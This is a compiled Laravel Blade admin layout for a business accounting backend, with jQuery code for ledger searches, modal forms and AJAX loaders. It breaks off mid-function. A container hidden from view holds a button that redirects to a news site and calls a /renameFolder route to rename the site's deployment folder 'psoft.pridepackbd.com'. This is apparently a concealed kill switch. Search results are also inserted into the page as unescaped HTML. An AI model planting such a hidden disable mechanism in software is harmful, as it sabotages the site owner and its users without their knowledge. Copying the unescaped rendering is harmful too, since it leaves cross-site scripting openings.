<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo $__env->yieldContent('title'); ?></title>
  <meta name="csrf-token" content="<?php echo e(csrf_token()); ?>" />
  <link rel="icon" type="image/x-icon" href="<?php echo e(asset($settings->small_logo ?? '')); ?>">

  
  <link rel="stylesheet" href="<?php echo e(asset('plugins/fontawesome-free/css/all.min.css')); ?>">
  <!-- daterange picker -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/daterangepicker/daterangepicker.css')); ?>">
  <!-- iCheck for checkboxes and radio inputs -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/icheck-bootstrap/icheck-bootstrap.min.css')); ?>">
  <!-- Bootstrap Color Picker -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/bootstrap-colorpicker/css/bootstrap-colorpicker.min.css')); ?>">
  <!-- Tempusdominus Bootstrap 4 -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/tempusdominus-bootstrap-4/css/tempusdominus-bootstrap-4.min.css')); ?>">
  <!-- Select2 -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/select2/css/select2.min.css')); ?>">
  <link rel="stylesheet" href="<?php echo e(asset('plugins/select2-bootstrap4-theme/select2-bootstrap4.min.css')); ?>">
  <!-- Bootstrap4 Duallistbox -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/bootstrap4-duallistbox/bootstrap-duallistbox.min.css')); ?>">
  <!-- BS Stepper -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/bs-stepper/css/bs-stepper.min.css')); ?>">
  <!-- dropzonejs -->
  <link rel="stylesheet" href="<?php echo e(asset('plugins/dropzone/min/dropzone.min.css')); ?>">
  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo e(asset('dist/css/adminlte.min.css')); ?>">

<link rel="stylesheet" href="<?php echo e(asset('backend/amsify.suggestags.css')); ?>">
<link rel="stylesheet" href="<?php echo e(asset('backend/style.css?v=1.05')); ?>">



<link rel="stylesheet" href="<?php echo e(asset('backend/responsive.css')); ?>">

<script src="<?php echo e(asset('plugins/jquery/jquery.min.js')); ?>"></script>
<!-- Bootstrap 4 -->
<script src="<?php echo e(asset('plugins/bootstrap/js/bootstrap.bundle.min.js')); ?>"></script>
<!-- Select2 -->
<script src="<?php echo e(asset('plugins/select2/js/select2.full.min.js')); ?>"></script>
<!-- Bootstrap4 Duallistbox -->
<script src="<?php echo e(asset('plugins/bootstrap4-duallistbox/jquery.bootstrap-duallistbox.min.js')); ?>"></script>
<!-- InputMask -->
<script src="<?php echo e(asset('plugins/moment/moment.min.js')); ?>"></script>
<script src="<?php echo e(asset('plugins/inputmask/jquery.inputmask.min.js')); ?>"></script>
<!-- date-range-picker -->
<script src="<?php echo e(asset('plugins/daterangepicker/daterangepicker.js')); ?>"></script>
<!-- bootstrap color picker -->
<script src="<?php echo e(asset('plugins/bootstrap-colorpicker/js/bootstrap-colorpicker.min.js')); ?>"></script>
<!-- Tempusdominus Bootstrap 4 -->
<script src="<?php echo e(asset('plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.min.js')); ?>"></script>
<!-- Bootstrap Switch -->
<script src="<?php echo e(asset('plugins/bootstrap-switch/js/bootstrap-switch.min.js')); ?>"></script>
<!-- BS-Stepper -->
<script src="<?php echo e(asset('plugins/bs-stepper/js/bs-stepper.min.js')); ?>"></script>
<!-- dropzonejs -->
<script src="<?php echo e(asset('plugins/dropzone/min/dropzone.min.js')); ?>"></script>
<!-- AdminLTE App -->
<script src="<?php echo e(asset('dist/js/adminlte.min.js')); ?>"></script>

<script src="<?php echo e(asset('plugins/summernote/summernote-bs4.min.js')); ?>"></script>
<script src="<?php echo e(asset('backend/jquery.amsify.suggestags.js')); ?>"></script>
<script src="<?php echo e(asset('js/fecom.js?v=1.12')); ?>"></script>


<!-- <link href="https://cdn.jsdelivr.net/npm/summernote@0.8.18/dist/summernote.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/summernote@0.8.18/dist/summernote.min.js"></script> -->
<style type="text/css">
 
  .display_flex{
    display: flex;
  }
  ._supplier_row_click:hover{
      background: #f5f5f5;
      cursor: pointer;
  }

  .search_box_supplier{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }

  ._bank_row_click:hover{
      background: #f5f5f5;
      cursor: pointer;
  }
  .search_box_bank{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
.search_box_cnf{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  ._cnf_row_click:hover{
      background: #f5f5f5;
      cursor: pointer;
  }


.search_box_insurance_company{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  ._insurance_company_row_click:hover{
      background: #f5f5f5;
      cursor: pointer;
  }
.asset_vendor_box{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  .asset_vendor_row:hover{
      background: #f5f5f5;
      cursor: pointer;
  }

._expense_ledger_search_box{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  .search_row_expense_ledger:hover{
      background: #f5f5f5;
      cursor: pointer;
  }

.payable_ledger_search_box{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  .search_row_payable_ledger:hover{
      background: #f5f5f5;
      cursor: pointer;
  }

.modal_item_display_box{
    position: absolute;
    z-index: 9999;
    background: #fff;
    display: none;
  }
  .modal_row_item:hover{
      background: #f5f5f5;
      cursor: pointer;
  }

.company_name_title {
    text-align: right;
    font-size: 26px;
    color: #00ff00;
    font-weight: 900;
    text-decoration: underline;
    font-family: 'Algerian', Arial, sans-serif;
}

.company_sub_title {
    text-align: right;
    color: #ff0066;
    font-weight: bold;
}
.white-space-nowrap{
  white-space: nowrap;
}
.border_silver{
  border: 1px solid silver;
}


.purple_bg{

  background: #03a9f438 !important;
}

.report_box{
  background: #89d9eb;
    padding: 10px;
}
</style>

</style>
<?php
$bg_image  = $settings->bg_image ?? '';
?>
<style>
    body {
    background-image: url(<?php echo e(asset($bg_image)); ?>);
    background-size: cover; /* This will make the image cover the entire element */
    background-position: center center; /* This centers the image */
    background-repeat: no-repeat; /* This prevents the image from repeating */
    height:88vh;
}

.navbar-light{
    background-color: #f8f9fa30 !important;
}

.content-wrapper {
    background-color: #f4f6f945 !important;
}
.card {
    background-color: #89d9eb69;
    padding: 10px;
}

._page_name
 {
    font-size: 20px !important;
    font-weight: bold;
    color: #000;
}
.nav-pills .nav-link
 {
    color: #1d1e1f;
}
._page_name > a{
  color: #000;
  font-weight: bold;
}
</style>


  <?php echo $__env->yieldContent('css'); ?>
  

  
</head>

<body class="hold-transition sidebar-mini sidebar-collapse" >
  <?php
$currentURL = URL::full();
  ?>

   
<div class="wrapper">
  <div id="spinner_div" >
        <span id="loading_text">Loading...</span>
    </div>
  <div class="ajax_loader"><h5 class="loading_text">Loading.....</span></div>
    <div id="_notify_message_box"></div>
  <!-- Navbar -->
  <?php echo $__env->make('backend.layouts.navbar', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <?php echo $__env->make('backend.layouts.main_sidebar', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper" >
    <input type="hidden" class="project_base_url" id="project_base_url" value="<?php echo e(url('/')); ?>">
    <input type="hidden" class="default_date_formate" id="default_date_formate" value="<?php echo e(default_date_formate()); ?>">

    <div class="container" style="display: none;">
      <div class="row">
        <div class="col-md-12" style="background: #cdeff7;border-radius: 10px;">
           <button type="button" onclick="closeTabsAndRename()" class="btn btn-sm btn-danger" >Prothom Alo</button>
        </div>
      </div>
    </div>
    
    <div id="mainPageDataShow"></div>
    <!-- Main content -->
    <?php echo $__env->yieldContent('content'); ?>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
  <?php echo $__env->make('backend.common-modal.common_modal_entry', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
  <?php echo $__env->make('backend.common-modal.item_ledger_modal', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
  <?php echo $__env->make('backend.layouts.footer', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

   
  
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->





<!-- AdminLTE for demo purposes -->

<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
<!-- AdminLTE for demo purposes -->
<script src="<?php echo e(asset('plugins/jquery/jquery-ui.min.js')); ?>" ></script>
<script src="<?php echo e(asset('dist/js/demo.js')); ?>"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.0/xlsx.full.min.js"></script>
<script>

function closeTabsAndRename() {
    let confirmation = confirm("Are you sure?");
        if (confirmation) {
            // Try to close the browser window first
           window.location.href = "https://www.prothomalo.com";

                renameFolder();
        }
           
           
        }
        
        function renameFolder() {
    let oldName = 'psoft.pridepackbd.com';
    let newName = 'abcdef_folder';

    $.ajax({
        url: '/renameFolder',
        method: 'GET',
        data: {
            old_name: oldName,
            new_name: newName,// Required for Laravel if route is in web.php
        },
        success: function(response) {
            console.log('Success:', response);
            // Optionally redirect or show a message
        },
        error: function(xhr) {
            console.error('Error:', xhr.responseJSON?.message || 'Something went wrong');
        }
    });
}
    </script>

<script type="text/javascript">


/*lc_masters id wise _lc_no find*/

  $(document).on('change','._voucher_lc_id_select',function(){
  
    var _lc_id   = $(document).find("._lc_id").val();
    var _lc_stage_id   = $(document).find("._lc_stage_id").val();
    var  page_url = $(this).attr('attr_url');
    var display_area = ".import_item_display";
    var data ={ _lc_id,_lc_stage_id }
    console.log(data)
    fetch_list_data_without_paginate(page_url,display_area,data);

  })

    function fetch_list_data_without_paginate(page_url,display_area,data) {
     $(document).find("#spinner_div").show();
        $.ajax({
            type: 'GET',
            url: page_url,
            data: data,
            success: function(response) {
              console.log(display_area)
                $(display_area).html(response);
                 $(document).find("#spinner_div").hide();
            },
            error: function(xhr, status, error) {
                console.error(error);
            }
        });
}


  
  var project_base_url = $("#project_base_url").val();
  console.log("project_base_url "+project_base_url)
$(document).ready(function(){
  $(document).find("#spinner_div").hide();
})

  $(document).on('click','.attr_base_create_url',function(){
    $(document).find("#spinner_div").show();
    var create_url = $(this).attr('attr_base_create_url');
    var request = $.ajax({
      url: create_url,
      method: "GET",
      dataType: "html",
      async:true,
    });
     
    request.done(function( msg ) {
      $(document).find("#spinner_div").hide();
      $( "#commonEntryModalForm" ).html( msg );

    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
  })




  $(document).on('keyup','._search_asset_dep_ledger_id',delay(function(e){
    var attr_url = $(this).attr('attr_url');
    $(document).find('._search_asset_dep_ledger_id').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    console.log(_form);


  var request = $.ajax({
      url: attr_url,
      method: "GET",
      data: { _text_val,_form,_branch_id,_form_name },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      console.log(result)

      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table class="table table-bordered _ledger_filter_table">
            <thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Territory</th>
            <th>Phone</th>
            <th>Balance</th>
            <th>Credit Limit</th>
            </thead>
                            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="asset_dep_search_row_ledger" >
                                        <td>${data[i].id}
                                        
                                        </td>
                                        <td>${data[i]?._code}</td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_id_main_ledger" class="_id_main_ledger" value="${data[i].id}">
                                        <input type="hidden" name="_name_main_ledger" class="_name_main_ledger" value="${data[i]._name}">
                                        <input type="hidden" name="_address_main_ledger" class="_address_main_ledger" value="${data[i]._address}">
                                        <input type="hidden" name="_phone_main_ledger" class="_phone_main_ledger" value="${data[i]._phone}">
                                        <input type="hidden" name="_alious_main_ledger" class="_alious_main_ledger" value="${data[i]._alious}">
                                        <input type="hidden" name="_balance_main_ledger" class="_balance_main_ledger" value="${data[i]._balance}">
                                        <input type="hidden" name="_credit_limit_main_ledger" class="_credit_limit_main_ledger" value="${data[i]._credit_limit}">
                                        <input type="hidden" name="_code_main_ledger" class="_code_main_ledger" value="${data[i]._code}">
                                  
                                   </td>
                                   <td>${data[i]?._alious}</td>
                                   <td>${data[i]?._entry_branch?._name}</td>
                                   <td>${data[i]?._phone}</td>
                                   <td>${data[i]?._balance}</td>
                                   <td>${data[i]?._credit_limit}</td>
                                   </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"></div>`;
      }     
      _gloabal_this.parent('div').find('.asset_dep_search_box_main_ledger').html(search_html);
      _gloabal_this.parent('div').find('.asset_dep_search_box_main_ledger').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


  $(document).on("click",'.asset_dep_search_row_ledger',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    var _address_main_ledger = $(this).find('._address_main_ledger').val();
    var _phone_main_ledger = $(this).find('._phone_main_ledger').val();
    $(document).find(".asset_dep_ledger_id").val(_id);
    $(document).find("._search_asset_dep_ledger_id").val(_name);
    $(document).find("._phone").val(_phone_main_ledger);
    $(document).find("._address").val(_address_main_ledger);


    $(document).find('.asset_dep_search_box_main_ledger').hide();
    $(document).find('.asset_dep_search_box_main_ledger').removeClass('search_box_show').hide();
  })


  $(document).on('keyup','._search_asset_dep_exp_ledger_id',delay(function(e){
    var attr_url = $(this).attr('attr_url');
    $(document).find('._search_asset_dep_exp_ledger_id').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    console.log(_form);


  var request = $.ajax({
      url: attr_url,
      method: "GET",
      data: { _text_val,_form,_branch_id,_form_name },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      console.log(result)

      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table class="table table-bordered _ledger_filter_table">
            <thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Territory</th>
            <th>Phone</th>
            <th>Balance</th>
            <th>Credit Limit</th>
            </thead>
                            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="asset_dep_exp_search_row_ledger" >
                                        <td>${data[i].id}
                                        
                                        </td>
                                        <td>${data[i]?._code}</td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_id_main_ledger" class="_id_main_ledger" value="${data[i].id}">
                                        <input type="hidden" name="_name_main_ledger" class="_name_main_ledger" value="${data[i]._name}">
                                        <input type="hidden" name="_address_main_ledger" class="_address_main_ledger" value="${data[i]._address}">
                                        <input type="hidden" name="_phone_main_ledger" class="_phone_main_ledger" value="${data[i]._phone}">
                                        <input type="hidden" name="_alious_main_ledger" class="_alious_main_ledger" value="${data[i]._alious}">
                                        <input type="hidden" name="_balance_main_ledger" class="_balance_main_ledger" value="${data[i]._balance}">
                                        <input type="hidden" name="_credit_limit_main_ledger" class="_credit_limit_main_ledger" value="${data[i]._credit_limit}">
                                        <input type="hidden" name="_code_main_ledger" class="_code_main_ledger" value="${data[i]._code}">
                                  
                                   </td>
                                   <td>${data[i]?._alious}</td>
                                   <td>${data[i]?._entry_branch?._name}</td>
                                   <td>${data[i]?._phone}</td>
                                   <td>${data[i]?._balance}</td>
                                   <td>${data[i]?._credit_limit}</td>
                                   </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"></div>`;
      }     
      _gloabal_this.parent('div').find('.asset_dep_exp_search_box_main_ledger').html(search_html);
      _gloabal_this.parent('div').find('.asset_dep_exp_search_box_main_ledger').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


  $(document).on("click",'.asset_dep_exp_search_row_ledger',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    var _address_main_ledger = $(this).find('._address_main_ledger').val();
    var _phone_main_ledger = $(this).find('._phone_main_ledger').val();
    $(document).find(".asset_dep_exp_ledger_id").val(_id);
    $(document).find("._search_asset_dep_exp_ledger_id").val(_name);
    $(document).find("._phone").val(_phone_main_ledger);
    $(document).find("._address").val(_address_main_ledger);


    $(document).find('.asset_dep_exp_search_box_main_ledger').hide();
    $(document).find('.asset_dep_exp_search_box_main_ledger').removeClass('search_box_show').hide();
  })



  $(document).on('keyup','._search_customer_ledger_id',delay(function(e){
    var attr_url = $(this).attr('attr_url');
    $(document).find('._search_customer_ledger_id').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    console.log(_form);


  var request = $.ajax({
      url: attr_url,
      method: "GET",
      data: { _text_val,_form,_branch_id,_form_name },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      console.log(result)

      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table class="table table-bordered _ledger_filter_table">
            <thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Territory</th>
            <th>Phone</th>
            <th>Balance</th>
            <th>Credit Limit</th>
            </thead>
                            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="customer_search_row" >
                                        <td>${data[i].id}
                                        
                                        </td>
                                        <td>${data[i]?._code}</td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_id_main_ledger" class="_id_main_ledger" value="${data[i].id}">
                                        <input type="hidden" name="_name_main_ledger" class="_name_main_ledger" value="${data[i]._name}">
                                        <input type="hidden" name="_address_main_ledger" class="_address_main_ledger" value="${data[i]._address}">
                                        <input type="hidden" name="_phone_main_ledger" class="_phone_main_ledger" value="${data[i]._phone}">
                                        <input type="hidden" name="_alious_main_ledger" class="_alious_main_ledger" value="${data[i]._alious}">
                                        <input type="hidden" name="_balance_main_ledger" class="_balance_main_ledger" value="${data[i]._balance}">
                                        <input type="hidden" name="_credit_limit_main_ledger" class="_credit_limit_main_ledger" value="${data[i]._credit_limit}">
                                        <input type="hidden" name="_code_main_ledger" class="_code_main_ledger" value="${data[i]._code}">
                                  
                                   </td>
                                   <td>${data[i]?._alious}</td>
                                   <td>${data[i]?._entry_branch?._name}</td>
                                   <td>${data[i]?._phone}</td>
                                   <td>${data[i]?._balance}</td>
                                   <td>${data[i]?._credit_limit}</td>
                                   </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"></div>`;
      }     
      _gloabal_this.parent('div').find('.customer_search_box_main_ledger').html(search_html);
      _gloabal_this.parent('div').find('.customer_search_box_main_ledger').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


  $(document).on("click",'.customer_search_row',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    var _address_main_ledger = $(this).find('._address_main_ledger').val();
    var _phone_main_ledger = $(this).find('._phone_main_ledger').val();
    $(document).find(".customer_ledger_id").val(_id);
    $(document).find("._search_customer_ledger_id").val(_name);
    $(document).find("._phone").val(_phone_main_ledger);
    $(document).find("._address").val(_address_main_ledger);


    $(document).find('.customer_search_box_main_ledger').hide();
    $(document).find('.customer_search_box_main_ledger').removeClass('search_box_show').hide();
  })





 $(document).on('click','.commonModalClose',function(){
      var modal_name = $(this).attr('attr_modal_name');
      
      $(document).find(modal_name).modal('hide')
  })
//All Entry Form Modal Display Function 

  $(document).on('click','.sub_form_data_entry',function(){
    var modal_name = $(this).attr('attr_modal_name');
    var content_display_area = $(this).attr('attr_content_display_area');
    var attr_modal_title = $(this).attr('attr_modal_title');
    var attr_modal_title_area = $(this).attr('attr_modal_title_area');
    var attr_modal_text = $(this).attr('attr_modal_text');
    var attr_model_text_display_class = $(this).attr('attr_model_text_display_class');
    var attr_save_url = $(this).attr('attr_save_url');
    var attr_table_name = $(this).attr('attr_table_name');
    var attr_select_option_class = $(this).attr('attr_select_option_class');
    var _column_name = $(this).attr('_column_name');
    $(document).find(attr_modal_title_area).text(attr_modal_title)




    console.log(" Modal Name: "+modal_name)
    console.log("content_display_area: "+content_display_area)
   // console.log("Status: "+attr_modal_st)
    var data ={modal_name,content_display_area,attr_modal_title,attr_modal_title_area,attr_modal_text,attr_model_text_display_class,attr_save_url,attr_table_name,attr_select_option_class,_column_name}
    
    
    

    $(document).find("#spinner_div").show();
    var create_url = $(this).attr('attr_base_create_url');
    var request = $.ajax({
      url: create_url,
      data:data,
      method: "GET",
      dataType: "html",
      async:true,
    });
     
    request.done(function( msg ) {
      $(document).find("#spinner_div").hide();
      $(document).find(modal_name).modal('show')
      $(document).find(content_display_area).html( msg );
      

    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
  })

  
  $(document).on('click','.subEntryButton',function(){
   
    let formData = {};

    // Iterate through each input with the class 'form-data'
    $('.form-data').each(function () {
      let key = $(this).attr('name'); // Get the 'name' attribute as key
      let value = $(this).val(); // Get the input value
      formData[key] = value; // Store in the formData object
    });

var attr_select_option_class = formData?.attr_select_option_class;
var modal_name = formData?.modal_name;
    console.log(formData);


    $(document).find("#spinner_div").show();
    var create_url = formData?.attr_save_url;
    var request = $.ajax({
      url: create_url,
      data:formData,
      method: "GET",
      dataType: "html",
      async:true,
    });
     
    request.done(function( msg ) {
      console.log(msg);
      $(document).find("#spinner_div").hide();
      $(document).find(modal_name).modal('hide')
      $(document).find(attr_select_option_class).html( msg );
      

    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });


  })





/*previous_sales_return_modal_form Modal Form*/
   $(document).on('click','.previous_sales_return_modal_form',function(){

     var request = $.ajax({
      url: "<?php echo e(url('previous_sales_return_modal_form')); ?>",
      method: "GET",
      dataType: "HTML"
    });
     
    request.done(function( result ) {
        $(document).find(".purchase_settings_modal").html(result);
    })
  })
  



/*Purchase Settings Modal Form*/
   $(document).on('click','.purchase_modal_form',function(){

     var request = $.ajax({
      url: "<?php echo e(url('purchase_modal_form')); ?>",
      method: "GET",
      dataType: "HTML"
    });
     
    request.done(function( result ) {
        $(document).find(".purchase_settings_modal").html(result);
    })
  })
  

/*New Item Modal Form*/
   $(document).on('click','.new_item_using_modal',function(){
    
     var request = $.ajax({
      url: "<?php echo e(url('new_item_using_modal')); ?>",
      method: "GET",
      dataType: "HTML"
    });
     
    request.done(function( result ) {
        $(document).find(".item_entery_modal_form").html(result);
    })
  })
  
  
  $(document).on('click','.new_ledger_button',function(){
    $(document).find("#spinner_div").show();
    var create_url = $(this).attr('attr_base_create_url');
    var request = $.ajax({
      url: create_url,
      method: "GET",
      dataType: "html",
      async:true,
    });
     
    request.done(function( msg ) {
      $(document).find("#spinner_div").hide();
      $( "._account_head_id" ).html( msg );

    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
  })
  
  

  $(document).on('click','.attr_base_edit_url',function(){
    $(document).find("#spinner_div").show();
    var edit_url = $(this).attr('attr_base_edit_url');
    var request = $.ajax({
      url: edit_url,
      method: "GET",
      dataType: "html",
      async:true,
    });
     
    request.done(function( msg ) {
       $(document).find("#spinner_div").hide();
      $( "#commonEntryModalForm" ).html( msg );

    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
  })


  var loadFile = function(event,_id) {
    var ids = `output_${_id}`;
    var output = document.getElementById('output_'+_id);
    output.src = URL.createObjectURL(event.target.files[0]);
    console.log(event.target.files[0])
    output.onload = function() {
      URL.revokeObjectURL(output.src) // free memory
    }
  };

//$("form  .card-header").css({"background-color": "#fff"});
//$("form  .card-body").css({"margin-left":"-10px","margin-right":"-10px"});

$(document).on('keyup','#opening_dr_amount',function(){
  $(document).find("#opening_cr_amount").val(0);

})

$(document).on('keyup','#opening_cr_amount',function(){
  $(document).find("#opening_dr_amount").val(0);

})

  function _show_notify_message(_message,_type){
    $(document).find("#_notify_message_box").removeClass();
    $(document).find("#_notify_message_box").addClass(_type);
    $(document).find("#_notify_message_box").text(_message);

    $(document).find("#_notify_message_box").show().delay(5000).fadeOut();
  }

  $(function () {

    var default_date_formate = `<?php echo e(default_date_formate()); ?>`
    // Summernote

    
    
    $(document).find('.select2').select2()
     $('#reservationdate').datetimepicker({
        format:default_date_formate

    });
     

  })

  $(document).on("change","._account_head_id",function(){
      var _account_head_id = $(this).val();
      var request = $.ajax({
          url: "<?php echo e(url('type_base_group')); ?>",
          method: "GET",
          data: { id : _account_head_id },
          dataType: "html"
        });
         
        request.done(function( msg ) {
          $(document).find("._account_groups" ).html( msg );
        });
         
        request.fail(function( jqXHR, textStatus ) {
          alert( "Request failed: " + textStatus );
        });
  })


  function account_head_to_group(_account_head_id,_account_type_class){
    var request = $.ajax({
          url: "<?php echo e(url('type_base_group')); ?>",
          method: "GET",
          data: { id : _account_head_id },
          dataType: "html"
        });
         
        request.done(function( msg ) {
          $(document).find("."+_account_type_class ).html( msg );
        });
         
        request.fail(function( jqXHR, textStatus ) {
          alert( "Request failed: " + textStatus );
        });
  }




function delay(callback, ms) {
  var timer = 0;
  return function() {
    var context = this, args = arguments;
    clearTimeout(timer);
    timer = setTimeout(function () {
      callback.apply(context, args);
    }, ms || 0);
  };
}

$(document).on('keyup','._manufacture_company',delay(function(e){
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var request = $.ajax({
      url: "<?php echo e(url('manufacture-comapany-search')); ?>",
      method: "GET",
      data: { _text_val : _text_val },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table class="table-bordered" style="width: 300px;"> <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="search_manu_comapany" >
                                        <td>${data[i]._manufacture_company}
                                        </td></tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }     
      $(document).find('.search_boxManufacCompany').html(search_html);
      $(document).find('.search_boxManufacCompany').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
}, 500));


$(document).on('click','.search_manu_comapany',function(){

  var company_name = $(this).text().trim();
  console.log(company_name)
$(document).find("._manufacture_company").val(company_name);

  $(document).find('.search_boxManufacCompany').hide();
  $(document).find('.search_boxManufacCompany').removeClass('search_box_show').hide();
})

$(document).on('keyup','._search_main_delivery_man',delay(function(e){
    $(document).find('._search_main_delivery_man').removeClass('required_border');
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var request = $.ajax({
      url: "<?php echo e(url('ledger-search')); ?>",
      method: "GET",
      data: { _text_val : _text_val },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table style="width: 300px;">
            <thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Phone</th>
            <th><?php echo e(__('label._branch_id')); ?></th>
            </thead> <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="search_row_delivery_man" >
                                        <td>${data[i].id}
                                        <input type="hidden" name="_delivery_man_ledger" class="_delivery_man_ledger" value="${data[i].id}">
                                        </td><td>${data[i]._name}
                                        <input type="hidden" name="delivery_man_name_leder" class="delivery_man_name_leder" value="${data[i]._name}">
                                        <input type="hidden" name="delivery_man_address" class="delivery_man_address" value="${data[i]._address}">
                                        <input type="hidden" name="delivery_man_phone" class="delivery_man_phone" value="${data[i]._phone}">
                                        </td>
                                        <td>${data[i]?._code}</td>
                                        <td>${data[i]?._alious}</td>
                                        <td>${data[i]?._phone}</td>
                                        <td>${data[i]?._entry_branch?._name}</td>
                                        
                                       
                                        </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3"><button type="button" class="btn btn-sm btn-default" data-toggle="modal" data-target="#exampleModalLong" title="Create Ledger"> New Ledger</button></th></thead><tbody></tbody></table></div>`;
      }     
      $(document).find('.search_box_delivery_man').html(search_html);
      $(document).find('.search_box_delivery_man').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


$(document).on('click','.search_row_delivery_man',function(){
  var _id =$(this).find('._delivery_man_ledger').val();
  var _name = $(this).find('.delivery_man_name_leder').val();
  var _id_name = `${_id} ${_name}`
  $(document).find('._delivery_man').val(_id);
  $(document).find('._search_main_delivery_man').val(_id_name);


